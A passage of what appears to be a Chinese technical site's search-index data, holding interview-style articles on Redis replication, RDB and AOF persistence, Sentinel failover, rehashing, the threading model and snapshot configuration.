水平扩容支撑读高并发\nRedis replication 的核心机制     Redis 采用异步方式复制数据到 slave 节点，不过 Redis2.8 开始，slave node 会周期性地确认自己每次复制的数据量； 一个 master node 是可以配置多个 slave node 的； slave node 也可以连接其他的 slave node； slave node 做复制的时候，不会 block master node 的正常工作； slave node 在做复制的时候，也不会 block 对自己的查询操作，它会用旧的数据集来提供服务；但是复制完成的时候，需要删除旧数据集，加载新数据集，这个时候就会暂停对外服务了； slave node 主要用来进行横向扩容，做读写分离，扩容的 slave node 可以提高读的吞吐量。  注意，如果采用了主从架构，那么建议必须开启 master node 的持久化，不建议用 slave node 作为 master node 的数据热备，因为那样的话，如果你关掉 master 的持久化，可能在 master 宕机重启的时候数据是空的，然后可能一经过复制， slave node 的数据也丢了。\n另外，master 的各种备份方案，也需要做。万一本地的所有文件丢失了，从备份中挑选一份 rdb 去恢复 master，这样才能确保启动的时候，是有数据的，即使采用了后续讲解的高可用机制，slave node 可以自动接管 master node，但也可能 sentinel 还没检测到 master failure，master node 就自动重启了，还是可能导致上面所有的 slave node 数据被清空。\nRedis 主从复制的核心原理    当启动一个 slave node 的时候，它会发送一个 PSYNC 命令给 master node。\n如果这是 slave node 初次连接到 master node，那么会触发一次 full resynchronization 全量复制。此时 master 会启动一个后台线程，开始生成一份 RDB 快照文件，同时还会将从客户端 client 新收到的所有写命令缓存在内存中。 RDB 文件生成完毕后， master 会将这个 RDB 发送给 slave，slave 会先写入本地磁盘，然后再从本地磁盘加载到内存中，接着 master 会将内存中缓存的写命令发送到 slave，slave 也会同步这些数据。slave node 如果跟 master node 有网络故障，断开了连接，会自动重连，连接之后 master node 仅会复制给 slave 部分缺少的数据。\n主从复制的断点续传    从 Redis2.8 开始，就支持主从复制的断点续传，如果主从复制过程中，网络连接断掉了，那么可以接着上次复制的地方，继续复制下去，而不是从头开始复制一份。\nmaster node 会在内存中维护一个 backlog，master 和 slave 都会保存一个 replica offset 还有一个 master run id，offset 就是保存在 backlog 中的。如果 master 和 slave 网络连接断掉了，slave 会让 master 从上次 replica offset 开始继续复制，如果没有找到对应的 offset，那么就会执行一次 resynchronization 。\n 如果根据 host+ip 定位 master node，是不靠谱的，如果 master node 重启或者数据出现了变化，那么 slave node 应该根据不同的 run id 区分。\n 无磁盘化复制    master 在内存中直接创建 RDB ，然后发送给 slave，不会在自己本地落地磁盘了。只需要在配置文件中开启 repl-diskless-sync yes 即可。\nrepl-diskless-sync yes # 等待 5s 后再开始复制，因为要等更多 slave 重新连接过来 repl-diskless-sync-delay 5 过期 key 处理    slave 不会过期 key，只会等待 master 过期 key。如果 master 过期了一个 key，或者通过 LRU 淘汰了一个 key，那么会模拟一条 del 命令发送给 slave。\n复制的完整流程    slave node 启动时，会在自己本地保存 master node 的信息，包括 master node 的 host 和 ip ，但是复制流程没开始。\nslave node 内部有个定时任务，每秒检查是否有新的 master node 要连接和复制，如果发现，就跟 master node 建立 socket 网络连接。然后 slave node 发送 ping 命令给 master node。如果 master 设置了 requirepass，那么 slave node 必须发送 masterauth 的口令过去进行认证。master node 第一次执行全量复制，将所有数据发给 slave node。而在后续，master node 持续将写命令，异步复制给 slave node。\n全量复制     master 执行 bgsave ，在本地生成一份 rdb 快照文件。 master node 将 rdb 快照文件发送给 slave node，如果 rdb 复制时间超过 60 秒（repl-timeout），那么 slave node 就会认为复制失败，可以适当调大这个参数(对于千兆网卡的机器，一般每秒传输 100MB，6G 文件，很可能超过 60s) master node 在生成 rdb 时，会将所有新的写命令缓存在内存中，在 slave node 保存了 rdb 之后，再将新的写命令复制给 slave node。 如果在复制期间，内存缓冲区持续消耗超过 64MB，或者一次性超过 256MB，那么停止复制，复制失败。  client-output-buffer-limit slave 256MB 64MB 60  slave node 接收到 rdb 之后，清空自己的旧数据，然后重新加载 rdb 到自己的内存中，同时基于旧的数据版本对外提供服务。 如果 slave node 开启了 AOF，那么会立即执行 BGREWRITEAOF，重写 AOF。  增量复制     如果全量复制过程中，master-slave 网络连接断掉，那么 slave 重新连接 master 时，会触发增量复制。 master 直接从自己的 backlog 中获取部分丢失的数据，发送给 slave node，默认 backlog 就是 1MB。 master 就是根据 slave 发送的 psync 中的 offset 来从 backlog 中获取数据的。  heartbeat    主从节点互相都会发送 heartbeat 信息。\nmaster 默认每隔 10 秒发送一次 heartbeat，slave node 每隔 1 秒发送一个 heartbeat。\n异步复制    master 每次接收到写命令之后，先在内部写入数据，然后异步发送给 slave node。\nRedis 如何才能做到高可用    如果系统在 365 天内，有 99.99% 的时间，都是可以哗哗对外提供服务的，那么就说系统是高可用的。\n一个 slave 挂掉了，是不会影响可用性的，还有其它的 slave 在提供相同数据下的相同的对外的查询服务。\n但是，如果 master node 死掉了，会怎么样？没法写数据了，写缓存的时候，全部失效了。slave node 还有什么用呢，没有 master 给它们复制数据了，系统相当于不可用了。\nRedis 的高可用架构，叫做 failover 故障转移，也可以叫做主备切换。\nmaster node 在故障时，自动检测，并且将某个 slave node 自动切换为 master node 的过程，叫做主备切换。这个过程，实现了 Redis 的主从架构下的高可用。\n后面会详细说明 Redis 基于哨兵的高可用性。\n"},{"id":286,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-persistence/","title":"redis-persistence","parent":"高并发","content":"面试题    Redis 的持久化有哪几种方式？不同的持久化机制都有什么优缺点？持久化机制具体底层是如何实现的？\n面试官心理分析    Redis 如果仅仅只是将数据缓存在内存里面，如果 Redis 宕机了再重启，内存里的数据就全部都弄丢了啊。你必须得用 Redis 的持久化机制，将数据写入内存的同时，异步的慢慢的将数据写入磁盘文件里，进行持久化。\n如果 Redis 宕机重启，自动从磁盘上加载之前持久化的一些数据就可以了，也许会丢失少许数据，但是至少不会将所有数据都弄丢。\n这个其实一样，针对的都是 Redis 的生产环境可能遇到的一些问题，就是 Redis 要是挂了再重启，内存里的数据不就全丢了？能不能重启的时候把数据给恢复了？\n面试题剖析    持久化主要是做灾难恢复、数据恢复，也可以归类到高可用的一个环节中去，比如你 Redis 整个挂了，然后 Redis 就不可用了，你要做的事情就是让 Redis 变得可用，尽快变得可用。\n重启 Redis，尽快让它对外提供服务，如果没做数据备份，这时候 Redis 启动了，也不可用啊，数据都没了。\n很可能说，大量的请求过来，缓存全部无法命中，在 Redis 里根本找不到数据，这个时候就死定了，出现缓存雪崩问题。所有请求没有在 Redis 命中，就会去 mysql 数据库这种数据源头中去找，一下子 mysql 承接高并发，然后就挂了\u0026hellip;\n如果你把 Redis 持久化做好，备份和恢复方案做到企业级的程度，那么即使你的 Redis 故障了，也可以通过备份数据，快速恢复，一旦恢复立即对外提供服务。\nRedis 持久化的两种方式     RDB：RDB 持久化机制，是对 Redis 中的数据执行周期性的持久化。 AOF：AOF 机制对每条写入命令作为日志，以 append-only 的模式写入一个日志文件中，在 Redis 重启的时候，可以通过回放 AOF 日志中的写入指令来重新构建整个数据集。  通过 RDB 或 AOF，都可以将 Redis 内存中的数据给持久化到磁盘上面来，然后可以将这些数据备份到别的地方去，比如说阿里云等云服务。\n如果 Redis 挂了，服务器上的内存和磁盘上的数据都丢了，可以从云服务上拷贝回来之前的数据，放到指定的目录中，然后重新启动 Redis，Redis 就会自动根据持久化数据文件中的数据，去恢复内存中的数据，继续对外提供服务。\n如果同时使用 RDB 和 AOF 两种持久化机制，那么在 Redis 重启的时候，会使用 AOF 来重新构建数据，因为 AOF 中的数据更加完整。\nRDB 优缺点     RDB 会生成多个数据文件，每个数据文件都代表了某一个时刻中 Redis 的数据，这种多个数据文件的方式，非常适合做冷备，可以将这种完整的数据文件发送到一些远程的安全存储上去，比如说 Amazon 的 S3 云服务上去，在国内可以是阿里云的 ODPS 分布式存储上，以预定好的备份策略来定期备份 Redis 中的数据。 RDB 对 Redis 对外提供的读写服务，影响非常小，可以让 Redis 保持高性能，因为 Redis 主进程只需要 fork 一个子进程，让子进程执行磁盘 IO 操作来进行 RDB 持久化即可。 相对于 AOF 持久化机制来说，直接基于 RDB 数据文件来重启和恢复 Redis 进程，更加快速。 如果想要在 Redis 故障时，尽可能少的丢失数据，那么 RDB 没有 AOF 好。一般来说，RDB 数据快照文件，都是每隔 5 分钟，或者更长时间生成一次，这个时候就得接受一旦 Redis 进程宕机，那么会丢失最近 5 分钟（甚至更长时间）的数据。 RDB 每次在 fork 子进程来执行 RDB 快照数据文件生成的时候，如果数据文件特别大，可能会导致对客户端提供的服务暂停数毫秒，或者甚至数秒。  AOF 优缺点     AOF 可以更好的保护数据不丢失，一般 AOF 会每隔 1 秒，通过一个后台线程执行一次 fsync 操作，最多丢失 1 秒钟的数据。 AOF 日志文件以 append-only 模式写入，所以没有任何磁盘寻址的开销，写入性能非常高，而且文件不容易破损，即使文件尾部破损，也很容易修复。 AOF 日志文件即使过大的时候，出现后台重写操作，也不会影响客户端的读写。因为在 rewrite log 的时候，会对其中的指令进行压缩，创建出一份需要恢复数据的最小日志出来。在创建新日志文件的时候，老的日志文件还是照常写入。当新的 merge 后的日志文件 ready 的时候，再交换新老日志文件即可。 AOF 日志文件的命令通过可读较强的方式进行记录，这个特性非常适合做灾难性的误删除的紧急恢复。比如某人不小心用 flushall 命令清空了所有数据，只要这个时候后台 rewrite 还没有发生，那么就可以立即拷贝 AOF 文件，将最后一条 flushall 命令给删了，然后再将该 AOF 文件放回去，就可以通过恢复机制，自动恢复所有数据。 对于同一份数据来说，AOF 日志文件通常比 RDB 数据快照文件更大。 AOF 开启后，支持的写 QPS 会比 RDB 支持的写 QPS 低，因为 AOF 一般会配置成每秒 fsync 一次日志文件，当然，每秒一次 fsync ，性能也还是很高的。（如果实时写入，那么 QPS 会大降，Redis 性能会大大降低） 以前 AOF 发生过 bug，就是通过 AOF 记录的日志，进行数据恢复的时候，没有恢复一模一样的数据出来。所以说，类似 AOF 这种较为复杂的基于命令日志 merge 回放的方式，比基于 RDB 每次持久化一份完整的数据快照文件的方式，更加脆弱一些，容易有 bug。不过 AOF 就是为了避免 rewrite 过程导致的 bug，因此每次 rewrite 并不是基于旧的指令日志进行 merge 的，而是基于当时内存中的数据进行指令的重新构建，这样健壮性会好很多。  RDB 和 AOF 到底该如何选择     不要仅仅使用 RDB，因为那样会导致你丢失很多数据； 也不要仅仅使用 AOF，因为那样有两个问题：第一，你通过 AOF 做冷备，没有 RDB 做冷备来的恢复速度更快；第二，RDB 每次简单粗暴生成数据快照，更加健壮，可以避免 AOF 这种复杂的备份和恢复机制的 bug； Redis 支持同时开启开启两种持久化方式，我们可以综合使用 AOF 和 RDB 两种持久化机制，用 AOF 来保证数据不丢失，作为数据恢复的第一选择；用 RDB 来做不同程度的冷备，在 AOF 文件都丢失或损坏不可用的时候，还可以使用 RDB 来进行快速的数据恢复。  "},{"id":287,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-production-environment/","title":"redis-production-environment","parent":"高并发","content":"面试题    生产环境中的 Redis 是怎么部署的？\n面试官心理分析    看看你了解不了解你们公司的 Redis 生产集群的部署架构，如果你不了解，那么确实你就很失职了，你的 Redis 是主从架构？集群架构？用了哪种集群方案？有没有做高可用保证？有没有开启持久化机制确保可以进行数据恢复？线上 Redis 给几个 G 的内存？设置了哪些参数？压测后你们 Redis 集群承载多少 QPS？\n兄弟，这些你必须是门儿清的，否则你确实是没好好思考过。\n面试题剖析    Redis cluster，10 台机器，5 台机器部署了 Redis 主实例，另外 5 台机器部署了 Redis 的从实例，每个主实例挂了一个从实例，5 个节点对外提供读写服务，每个节点的读写高峰 QPS 可能可以达到每秒 5 万，5 台机器最多是 25 万读写请求每秒。\n机器是什么配置？32G 内存+ 8 核 CPU + 1T 磁盘，但是分配给 Redis 进程的是 10g 内存，一般线上生产环境，Redis 的内存尽量不要超过 10g，超过 10g 可能会有问题。\n5 台机器对外提供读写，一共有 50g 内存。\n因为每个主实例都挂了一个从实例，所以是高可用的，任何一个主实例宕机，都会自动故障迁移，Redis 从实例会自动变成主实例继续提供读写服务。\n你往内存里写的是什么数据？每条数据的大小是多少？商品数据，每条数据是 10kb。100 条数据是 1mb，10 万条数据是 1g。常驻内存的是 200 万条商品数据，占用内存是 20g，仅仅不到总内存的 50%。目前高峰期每秒就是 3500 左右的请求量。\n其实大型的公司，会有基础架构的 team 负责缓存集群的运维。\n"},{"id":288,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-rehash/","title":"redis-rehash","parent":"高并发","content":"面试题    有了解过 Redis rehash 的过程吗？\n面试官心理分析    这个知识点算 redis 中比较低频的面试点，但是当你在介绍 HashMap 的 rehash 或者 ConcurrentHashMap 的 rehash 过程中，可以主动和面试官提及你不仅了解这些，同时还了解 Redis 中的 rehash 过程。\nRedis 是以速度快，性能好著称的，我们知道 Redis 一开始的容量是有限的，当容量不足时，需要扩容，那扩容的方式是什么？一次性全部将数据转移吗？那当数据量上千万上亿，这必定会阻塞 Redis 对命令的执行。因此就非常有必要了解一下 Redis 中的 rehash 过程。\n面试题剖析    众所周知，Redis 主要用于存储键值对(Key-Value Pair)，而键值对的存储方式是由字典实现，而 Redis 中字典的底层又是通过哈希表来实现的。通过哈希表中的节点保存字典中的键值对。类似 Java 中的 HashMap，将 Key 通过哈希函数映射到哈希表节点位置。\nRedis 中字典的数据结构如下：\n// 字典对应的数据结构，有关hash表的结构可以参考redis源码，再次就不进行描述 typedef struct dict { dictType *type; // 字典类型  void *privdata; // 私有数据  dictht ht[2]; // 2个哈希表，这也是进行rehash的重要数据结构，从这也看出字典的底层通过哈希表进行实现。  long rehashidx; // rehash过程的重要标志，值为-1表示rehash未进行  int iterators; // 当前正在迭代的迭代器数 } dict; 在对哈希表进行扩展或者收缩操作时，程序需要将现有哈希表包含的所有键值对 rehash 到新哈希表里面，具体过程如下：\n1. 为字典的备用哈希表分配空间。    如果执行的是扩展操作，那么备用哈希表的大小为第一个大于等于需要扩容的哈希表的键值对数量*2 的 2\u0026quot;(2 的 n 次方幂);【5*2=10,所以备用哈希表的容量为第一个大于 10 的 2\u0026quot;，即 16】\n如果执行的是收缩操作,那么备用哈希表的大小为第一个大于等于需要扩容的哈希表的键值对数量（ht[0] .used）的 2\u0026quot;。\n2. 渐进式 rehash    rehash 过程在数据量非常大（几千万、亿）的情况下并不是一次性地完成的，而是渐进式地完成的。渐进式 rehash的好处在于避免对服务器造成影响。\n渐进式 rehash 的本质：\n 借助 rehashidx，将 rehash 键值对所需的计算工作均摊到对字典的每个添加、删除、查找和更新操作上，从而避免了集中式 rehash 而带来的庞大计算量。 在 rehash 进行期间，每次对字典执行添加、删除、查找或者更新操作时，程序除了执行指定的操作以外，还会顺带将原哈希表在 rehashidx 索引上的所有键值对 rehash 到备用哈希表，当 rehash 工作完成之后，程序将 rehashidx 属性的值加 1。  "},{"id":289,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-sentinel/","title":"redis-sentinel","parent":"高并发","content":"Redis 哨兵集群实现高可用    哨兵的介绍    sentinel，中文名是哨兵。哨兵是 Redis 集群架构中非常重要的一个组件，主要有以下功能：\n 集群监控：负责监控 Redis master 和 slave 进程是否正常工作。 消息通知：如果某个 Redis 实例有故障，那么哨兵负责发送消息作为报警通知给管理员。 故障转移：如果 master node 挂掉了，会自动转移到 slave node 上。 配置中心：如果故障转移发生了，通知 client 客户端新的 master 地址。  哨兵用于实现 Redis 集群的高可用，本身也是分布式的，作为一个哨兵集群去运行，互相协同工作。\n 故障转移时，判断一个 master node 是否宕机了，需要大部分的哨兵都同意才行，涉及到了分布式选举的问题。 即使部分哨兵节点挂掉了，哨兵集群还是能正常工作的，因为如果一个作为高可用机制重要组成部分的故障转移系统本身是单点的，那就很坑爹了。  哨兵的核心知识     哨兵至少需要 3 个实例，来保证自己的健壮性。 哨兵 + Redis 主从的部署架构，是不保证数据零丢失的，只能保证 Redis 集群的高可用性。 对于哨兵 + Redis 主从这种复杂的部署架构，尽量在测试环境和生产环境，都进行充足的测试和演练。  哨兵集群必须部署 2 个以上节点，如果哨兵集群仅仅部署了 2 个哨兵实例，quorum = 1。\n+----+ +----+ | M1 |---------| R1 | | S1 | | S2 | +----+ +----+ 配置 quorum=1 ，如果 master 宕机， s1 和 s2 中只要有 1 个哨兵认为 master 宕机了，就可以进行切换，同时 s1 和 s2 会选举出一个哨兵来执行故障转移。但是同时这个时候，需要 majority，也就是大多数哨兵都是运行的。\n2 个哨兵，majority=2 3 个哨兵，majority=2 4 个哨兵，majority=2 5 个哨兵，majority=3 ... 如果此时仅仅是 M1 进程宕机了，哨兵 s1 正常运行，那么故障转移是 OK 的。但是如果是整个 M1 和 S1 运行的机器宕机了，那么哨兵只有 1 个，此时就没有 majority 来允许执行故障转移，虽然另外一台机器上还有一个 R1，但是故障转移不会执行。\n经典的 3 节点哨兵集群是这样的：\n +----+ | M1 | | S1 | +----+ | +----+ | +----+ | R2 |----+----| R3 | | S2 | | S3 | +----+ +----+ 配置 quorum=2 ，如果 M1 所在机器宕机了，那么三个哨兵还剩下 2 个，S2 和 S3 可以一致认为 master 宕机了，然后选举出一个来执行故障转移，同时 3 个哨兵的 majority 是 2，所以还剩下的 2 个哨兵运行着，就可以允许执行故障转移。\nRedis 哨兵主备切换的数据丢失问题    导致数据丢失的两种情况    主备切换的过程，可能会导致数据丢失：\n 异步复制导致的数据丢失  因为 master-\u0026gt;slave 的复制是异步的，所以可能有部分数据还没复制到 slave，master 就宕机了，此时这部分数据就丢失了。\n 脑裂导致的数据丢失  脑裂，也就是说，某个 master 所在机器突然脱离了正常的网络，跟其他 slave 机器不能连接，但是实际上 master 还运行着。此时哨兵可能就会认为 master 宕机了，然后开启选举，将其他 slave 切换成了 master。这个时候，集群里就会有两个 master ，也就是所谓的脑裂。\n此时虽然某个 slave 被切换成了 master，但是可能 client 还没来得及切换到新的 master，还继续向旧 master 写数据。因此旧 master 再次恢复的时候，会被作为一个 slave 挂到新的 master 上去，自己的数据会清空，重新从新的 master 复制数据。而新的 master 并没有后来 client 写入的数据，因此，这部分数据也就丢失了。\n数据丢失问题的解决方案    进行如下配置：\nmin-slaves-to-write 1 min-slaves-max-lag 10 表示，要求至少有 1 个 slave，数据复制和同步的延迟不能超过 10 秒。\n如果说一旦所有的 slave，数据复制和同步的延迟都超过了 10 秒钟，那么这个时候，master 就不会再接收任何请求了。\n 减少异步复制数据的丢失  有了 min-slaves-max-lag 这个配置，就可以确保说，一旦 slave 复制数据和 ack 延时太长，就认为可能 master 宕机后损失的数据太多了，那么就拒绝写请求，这样可以把 master 宕机时由于部分数据未同步到 slave 导致的数据丢失降低的可控范围内。\n 减少脑裂的数据丢失  如果一个 master 出现了脑裂，跟其他 slave 丢了连接，那么上面两个配置可以确保说，如果不能继续给指定数量的 slave 发送数据，而且 slave 超过 10 秒没有给自己 ack 消息，那么就直接拒绝客户端的写请求。因此在脑裂场景下，最多就丢失 10 秒的数据。\nsdown 和 odown 转换机制     sdown 是主观宕机，就一个哨兵如果自己觉得一个 master 宕机了，那么就是主观宕机 odown 是客观宕机，如果 quorum 数量的哨兵都觉得一个 master 宕机了，那么就是客观宕机  sdown 达成的条件很简单，如果一个哨兵 ping 一个 master，超过了 is-master-down-after-milliseconds 指定的毫秒数之后，就主观认为 master 宕机了；如果一个哨兵在指定时间内，收到了 quorum 数量的其它哨兵也认为那个 master 是 sdown 的，那么就认为是 odown 了。\n哨兵集群的自动发现机制    哨兵互相之间的发现，是通过 Redis 的 pub/sub 系统实现的，每个哨兵都会往 __sentinel__:hello 这个 channel 里发送一个消息，这时候所有其他哨兵都可以消费到这个消息，并感知到其他的哨兵的存在。\n每隔两秒钟，每个哨兵都会往自己监控的某个 master+slaves 对应的 __sentinel__:hello channel 里发送一个消息，内容是自己的 host、ip 和 runid 还有对这个 master 的监控配置。\n每个哨兵也会去监听自己监控的每个 master+slaves 对应的 __sentinel__:hello channel，然后去感知到同样在监听这个 master+slaves 的其他哨兵的存在。\n每个哨兵还会跟其他哨兵交换对 master 的监控配置，互相进行监控配置的同步。\nslave 配置的自动纠正    哨兵会负责自动纠正 slave 的一些配置，比如 slave 如果要成为潜在的 master 候选人，哨兵会确保 slave 复制现有 master 的数据；如果 slave 连接到了一个错误的 master 上，比如故障转移之后，那么哨兵会确保它们连接到正确的 master 上。\nslave-\u0026gt;master 选举算法    如果一个 master 被认为 odown 了，而且 majority 数量的哨兵都允许主备切换，那么某个哨兵就会执行主备切换操作，此时首先要选举一个 slave 来，会考虑 slave 的一些信息：\n 跟 master 断开连接的时长 slave 优先级 复制 offset run id  如果一个 slave 跟 master 断开连接的时间已经超过了 down-after-milliseconds 的 10 倍，外加 master 宕机的时长，那么 slave 就被认为不适合选举为 master。\n(down-after-milliseconds * 10) + milliseconds_since_master_is_in_SDOWN_state 接下来会对 slave 进行排序：\n 按照 slave 优先级进行排序，slave priority 越低，优先级就越高。 如果 slave priority 相同，那么看 replica offset，哪个 slave 复制了越多的数据，offset 越靠后，优先级就越高。 如果上面两个条件都相同，那么选择一个 run id 比较小的那个 slave。  quorum 和 majority    每次一个哨兵要做主备切换，首先需要 quorum 数量的哨兵认为 odown，然后选举出一个哨兵来做切换，这个哨兵还需要得到 majority 哨兵的授权，才能正式执行切换。\n如果 quorum \u0026lt; majority，比如 5 个哨兵，majority 就是 3，quorum 设置为 2，那么就 3 个哨兵授权就可以执行切换。\n但是如果 quorum \u0026gt;= majority，那么必须 quorum 数量的哨兵都授权，比如 5 个哨兵，quorum 是 5，那么必须 5 个哨兵都同意授权，才能执行切换。\nconfiguration epoch    哨兵会对一套 Redis master+slaves 进行监控，有相应的监控的配置。\n执行切换的那个哨兵，会从要切换到的新 master（salve-\u0026gt;master）那里得到一个 configuration epoch，这就是一个 version 号，每次切换的 version 号都必须是唯一的。\n如果第一个选举出的哨兵切换失败了，那么其他哨兵，会等待 failover-timeout 时间，然后接替继续执行切换，此时会重新获取一个新的 configuration epoch，作为新的 version 号。\nconfiguration 传播    哨兵完成切换之后，会在自己本地更新生成最新的 master 配置，然后同步给其他的哨兵，就是通过之前说的 pub/sub 消息机制。\n这里之前的 version 号就很重要了，因为各种消息都是通过一个 channel 去发布和监听的，所以一个哨兵完成一次新的切换之后，新的 master 配置是跟着新的 version 号的。其他的哨兵都是根据版本号的大小来更新自己的 master 配置的。\n"},{"id":290,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-single-thread-model/","title":"redis-single-thread-model","parent":"高并发","content":"面试题    Redis 和 Memcached 有什么区别？Redis 的线程模型是什么？为什么 Redis 单线程却能支撑高并发？\n面试官心理分析    这个是问 Redis 的时候，最基本的问题吧，Redis 最基本的一个内部原理和特点，就是 Redis 实际上是个单线程工作模型，你要是这个都不知道，那后面玩儿 Redis 的时候，出了问题岂不是什么都不知道？\n还有可能面试官会问问你 Redis 和 Memcached 的区别，但是 Memcached 是早些年各大互联网公司常用的缓存方案，但是现在近几年基本都是 Redis，没什么公司用 Memcached 了。\n面试题剖析    Redis 和 Memcached 有啥区别？    Redis 支持复杂的数据结构    Redis 相比 Memcached 来说，拥有更多的数据结构，能支持更丰富的数据操作。如果需要缓存能够支持更复杂的结构和操作， Redis 会是不错的选择。\nRedis 原生支持集群模式    在 Redis3.x 版本中，便能支持 cluster 模式，而 Memcached 没有原生的集群模式，需要依靠客户端来实现往集群中分片写入数据。\n性能对比    由于 Redis 只使用单核，而 Memcached 可以使用多核，所以平均每一个核上 Redis 在存储小数据时比 Memcached 性能更高。而在 100k 以上的数据中，Memcached 性能要高于 Redis。虽然 Redis 最近也在存储大数据的性能上进行优化，但是比起 Memcached，还是稍有逊色。\nRedis 的线程模型    Redis 内部使用文件事件处理器 file event handler ，这个文件事件处理器是单线程的，所以 Redis 才叫做单线程的模型。它采用 IO 多路复用机制同时监听多个 socket，将产生事件的 socket 压入内存队列中，事件分派器根据 socket 上的事件类型来选择对应的事件处理器进行处理。\n文件事件处理器的结构包含 4 个部分：\n 多个 socket IO 多路复用程序 文件事件分派器 事件处理器（连接应答处理器、命令请求处理器、命令回复处理器）  多个 socket 可能会并发产生不同的操作，每个操作对应不同的文件事件，但是 IO 多路复用程序会监听多个 socket，会将产生事件的 socket 放入队列中排队，事件分派器每次从队列中取出一个 socket，根据 socket 的事件类型交给对应的事件处理器进行处理。\n来看客户端与 Redis 的一次通信过程：\n要明白，通信是通过 socket 来完成的，不懂的同学可以先去看一看 socket 网络编程。\n首先，Redis 服务端进程初始化的时候，会将 server socket 的 AE_READABLE 事件与连接应答处理器关联。\n客户端 socket01 向 Redis 进程的 server socket 请求建立连接，此时 server socket 会产生一个 AE_READABLE 事件，IO 多路复用程序监听到 server socket 产生的事件后，将该 socket 压入队列中。文件事件分派器从队列中获取 socket，交给连接应答处理器。连接应答处理器会创建一个能与客户端通信的 socket01，并将该 socket01 的 AE_READABLE 事件与命令请求处理器关联。\n假设此时客户端发送了一个 set key value 请求，此时 Redis 中的 socket01 会产生 AE_READABLE 事件，IO 多路复用程序将 socket01 压入队列，此时事件分派器从队列中获取到 socket01 产生的 AE_READABLE 事件，由于前面 socket01 的 AE_READABLE 事件已经与命令请求处理器关联，因此事件分派器将事件交给命令请求处理器来处理。命令请求处理器读取 socket01 的 key value 并在自己内存中完成 key value 的设置。操作完成后，它会将 socket01 的 AE_WRITABLE 事件与命令回复处理器关联。\n如果此时客户端准备好接收返回结果了，那么 Redis 中的 socket01 会产生一个 AE_WRITABLE 事件，同样压入队列中，事件分派器找到相关联的命令回复处理器，由命令回复处理器对 socket01 输入本次操作的一个结果，比如 ok ，之后解除 socket01 的 AE_WRITABLE 事件与命令回复处理器的关联。\n这样便完成了一次通信。关于 Redis 的一次通信过程，推荐读者阅读《Redis 设计与实现——黄健宏》进行系统学习。\n为啥 Redis 单线程模型也能效率这么高？     纯内存操作。 核心是基于非阻塞的 IO 多路复用机制。 C 语言实现，一般来说，C 语言实现的程序“距离”操作系统更近，执行速度相对会更快。 单线程反而避免了多线程的频繁上下文切换问题，预防了多线程可能产生的竞争问题。  Redis 6.0 开始引入多线程    注意！ Redis 6.0 之后的版本抛弃了单线程模型这一设计，原本使用单线程运行的 Redis 也开始选择性地使用多线程模型。\n前面还在强调 Redis 单线程模型的高效性，现在为什么又要引入多线程？这其实说明 Redis 在有些方面，单线程已经不具有优势了。因为读写网络的 Read/Write 系统调用在 Redis 执行期间占用了大部分 CPU 时间，如果把网络读写做成多线程的方式对性能会有很大提升。\nRedis 的多线程部分只是用来处理网络数据的读写和协议解析，执行命令仍然是单线程。 之所以这么设计是不想 Redis 因为多线程而变得复杂，需要去控制 key、lua、事务、LPUSH/LPOP 等等的并发问题。\n总结    Redis 选择使用单线程模型处理客户端的请求主要还是因为 CPU 不是 Redis 服务器的瓶颈，所以使用多线程模型带来的性能提升并不能抵消它带来的开发成本和维护成本，系统的性能瓶颈也主要在网络 I/O 操作上；而 Redis 引入多线程操作也是出于性能上的考虑，对于一些大键值对的删除操作，通过多线程非阻塞地释放内存空间也能减少对 Redis 主线程阻塞的时间，提高执行的效率。\n"},{"id":291,"href":"/database/Redis/Redis%E6%8C%81%E4%B9%85%E5%8C%96/","title":"Redis持久化","parent":"Redis","content":"非常感谢《redis实战》真本书，本文大多内容也参考了书中的内容。非常推荐大家看一下《redis实战》这本书，感觉书中的很多理论性东西还是很不错的。\n为什么本文的名字要加上春夏秋冬又一春，哈哈 ，这是一部韩国的电影，我感觉电影不错，所以就用在文章名字上了，没有什么特别的含义，然后下面的有些配图也是电影相关镜头。\n很多时候我们需要持久化数据也就是将内存中的数据写入到硬盘里面，大部分原因是为了之后重用数据（比如重启机器、机器故障之后回复数据），或者是为了防止系统故障而将数据备份到一个远程位置。\nRedis不同于Memcached的很重要一点就是，Redis支持持久化，而且支持两种不同的持久化操作。Redis的一种持久化方式叫快照（snapshotting，RDB），另一种方式是只追加文件（append-only file,AOF）。这两种方法各有千秋，下面我会详细这两种持久化方法是什么，怎么用，如何选择适合自己的持久化方法。\n快照（snapshotting）持久化    Redis可以通过创建快照来获得存储在内存里面的数据在某个时间点上的副本。Redis创建快照之后，可以对快照进行备份，可以将快照复制到其他服务器从而创建具有相同数据的服务器副本（Redis主从结构，主要用来提高Redis性能），还可以将快照留在原地以便重启服务器的时候使用。\n快照持久化是Redis默认采用的持久化方式，在redis.conf配置文件中默认有此下配置：\nsave 900 1 #在900秒(15分钟)之后，如果至少有1个key发生变化，Redis就会自动触发BGSAVE命令创建快照。 save 300 10 #在300秒(5分钟)之后，如果至少有10个key发生变化，Redis就会自动触发BGSAVE命令创建快照。 save 60 10000 #在60秒(1分钟)之后，如果至少有10000个key发生变化，Redis就会自动触发BGSAVE命令创建快照。 根据配置，快照将被写入dbfilename选项指定的文件里面，并存储在dir选项指定的路径上面。如果在新的快照文件创建完毕之前，Redis、系统或者硬件这三者中的任意一个崩溃了，那么Redis将丢失最近一次创建快照写入的所有数据。\n举个例子：假设Redis的上一个快照是2：35开始创建的，并且已经创建成功。下午3：06时，Redis又开始创建新的快照，并且在下午3：08快照创建完毕之前，有35个键进行了更新。如果在下午3：06到3：08期间，系统发生了崩溃，导致Redis无法完成新快照的创建工作，那么Redis将丢失下午2：35之后写入的所有数据。另一方面，如果系统恰好在新的快照文件创建完毕之后崩溃，那么Redis将丢失35个键的更新数据。\n创建快照的办法有如下几种：\n BGSAVE命令： 客户端向Redis发送 BGSAVE命令 来创建一个快照。对于支持BGSAVE命令的平台来说（基本上所有平台支持，除了Windows平台），Redis会调用fork来创建一个子进程，然后子进程负责将快照写入硬盘，而父进程则继续处理命令请求。 SAVE命令： 客户端还可以向Redis发送 SAVE命令 来创建一个快照，接到SAVE命令的Redis服务器在快照创建完毕之前不会再响应任何其他命令。SAVE命令不常用，我们通常只会在没有足够内存去执行BGSAVE命令的情况下，又或者即使等待持久化操作执行完毕也无所谓的情况下，才会使用这个命令。 